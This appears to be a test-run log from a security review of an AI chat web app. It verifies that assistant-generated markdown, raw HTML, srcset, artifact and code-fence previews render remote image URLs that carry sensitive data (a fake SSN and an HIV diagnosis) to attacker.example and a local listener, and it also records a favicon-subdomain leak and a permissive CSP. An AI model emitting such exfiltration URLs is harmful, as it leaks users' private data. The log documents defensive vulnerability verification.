@@ -1,0 +1,71 @@
+
+ RUN  v4.1.10 /root/tinfoil-review/work/verify/webapp-render-xss--markdown-remote-image-exfil--poc/tinfoil-webapp
+
+stdout | tests/poc/verifier-streaming-chunked.test.tsx > StreamingChunkedText renders remote <img> from assistant markdown (first paint and after plugins)
+[verifier] first-paint img src: [
+  'https://127.0.0.1:48443/v.png?d=verifier-secret%3A%20SSN%20999-99-9999&via=md',
+  'https://127.0.0.1:48443/v.png?d=verifier-secret%3A%20SSN%20999-99-9999&via=raw',
+  'https://127.0.0.1:48443/v.png?d=verifier-secret%3A%20SSN%20999-99-9999&via=pic'
+]
+
+stdout | tests/poc/verifier-streaming-chunked.test.tsx > StreamingChunkedText renders remote <img> from assistant markdown (first paint and after plugins)
+[verifier] after-plugins img src: [
+  'https://127.0.0.1:48443/v.png?d=verifier-secret%3A%20SSN%20999-99-9999&via=md',
+  'https://127.0.0.1:48443/v.png?d=verifier-secret%3A%20SSN%20999-99-9999&via=raw',
+  'https://127.0.0.1:48443/v.png?d=verifier-secret%3A%20SSN%20999-99-9999&via=pic'
+]
+[verifier] after-plugins source srcset: [
+  'https://127.0.0.1:48443/v.png?d=verifier-secret%3A%20SSN%20999-99-9999&via=srcset'
+]
+
+stdout | tests/poc/dump-rendered-message.test.tsx > dumps the rendered assistant message
+[poc] wrote /root/tinfoil-review/work/verify/webapp-render-xss--markdown-remote-image-exfil--poc/browser-poc/rendered-message.html 2513 bytes
+[poc] img srcs: [
+  'https://127.0.0.1:48443/exfil.png?d=prior-turn%3A%20%22My%20name%20is%20Jane%20Roe%2C%20I%20was%20diagnosed%20with%20HIV%20in%202023%2C%20SSN%20123-45-6789%22&via=markdown-image',
+  'https://127.0.0.1:48443/exfil.png?d=prior-turn%3A%20%22My%20name%20is%20Jane%20Roe%2C%20I%20was%20diagnosed%20with%20HIV%20in%202023%2C%20SSN%20123-45-6789%22&via=raw-html-img'
+]
+
+stdout | tests/poc/verifier-streaming-chunked.test.tsx > streaming (isStreaming=true, mid-stream) already renders the remote <img>
+[verifier] streaming img src: [
+  'https://127.0.0.1:48443/v.png?d=verifier-secret%3A%20SSN%20999-99-9999&via=streaming'
+]
+
+ ✓ tests/poc/verifier-streaming-chunked.test.tsx > StreamingChunkedText renders remote <img> from assistant markdown (first paint and after plugins) 70ms
+ ✓ tests/poc/verifier-streaming-chunked.test.tsx > streaming (isStreaming=true, mid-stream) already renders the remote <img> 5ms
+ ✓ tests/poc/dump-rendered-message.test.tsx > dumps the rendered assistant message 76ms
+stdout | tests/poc/markdown-image-exfil.test.tsx > PoC: remote image exfiltration from model output > MessageContent (assistant chat bubble) renders attacker-controlled <img src> after the full plugin pipeline
+[poc] rendered <img src> values: [
+  'https://attacker.example/x.png?d=patient=John%20Doe%3B%20dx%3DHIV%3B%20ssn%3D123-45-6789&v=markdown',
+  'https://attacker.example/x.png?d=patient=John%20Doe%3B%20dx%3DHIV%3B%20ssn%3D123-45-6789&v=rawhtml',
+  'https://attacker.example/x.png?d=patient=John%20Doe%3B%20dx%3DHIV%3B%20ssn%3D123-45-6789&v=picture'
+]
+[poc] rendered <source srcset> values: [
+  'https://attacker.example/x.png?d=patient=John%20Doe%3B%20dx%3DHIV%3B%20ssn%3D123-45-6789&v=srcset'
+]
+
+stdout | tests/poc/markdown-image-exfil.test.tsx > PoC: remote image exfiltration from model output > MessageContent (assistant chat bubble) renders attacker-controlled <img src> after the full plugin pipeline
+[poc] favicon lookups requested for: [ 'https://leak-c3NuPTEyMy00NS02Nzg5.attacker.example/' ]
+
+stdout | tests/poc/markdown-image-exfil.test.tsx > PoC: remote image exfiltration from model output > GenUI render_artifact_preview (markdown source) renders attacker <img src> with no plugins at all
+[poc] artifact markdown img src: [
+  'https://attacker.example/x.png?d=patient=John%20Doe%3B%20dx%3DHIV%3B%20ssn%3D123-45-6789&v=artifact'
+]
+
+stdout | tests/poc/markdown-image-exfil.test.tsx > PoC: remote image exfiltration from model output > ```markdown code fence preview (auto-opened after streaming) renders attacker <img src>
+[poc] markdown code-fence preview img src: [
+  'https://attacker.example/x.png?d=patient=John%20Doe%3B%20dx%3DHIV%3B%20ssn%3D123-45-6789&v=codefence'
+]
+
+ ✓ tests/poc/markdown-image-exfil.test.tsx > PoC: remote image exfiltration from model output > MessageContent (assistant chat bubble) renders attacker-controlled <img src> after the full plugin pipeline 68ms
+ ✓ tests/poc/markdown-image-exfil.test.tsx > PoC: remote image exfiltration from model output > GenUI render_artifact_preview (markdown source) renders attacker <img src> with no plugins at all 7ms
+stdout | tests/poc/markdown-image-exfil.test.tsx > PoC: remote image exfiltration from model output > production CSP (vercel.json) allows the browser to fetch those images from any https origin
+[poc] production CSP img-src: img-src 'self' data: blob: https:
+
+ ✓ tests/poc/markdown-image-exfil.test.tsx > PoC: remote image exfiltration from model output > ```markdown code fence preview (auto-opened after streaming) renders attacker <img src> 30ms
+ ✓ tests/poc/markdown-image-exfil.test.tsx > PoC: remote image exfiltration from model output > production CSP (vercel.json) allows the browser to fetch those images from any https origin 1ms
+
+ Test Files  3 passed (3)
+      Tests  7 passed (7)
+   Start at  01:22:51
+   Duration  2.18s (transform 679ms, setup 222ms, import 3.58s, tests 264ms, environment 1.44s)
+
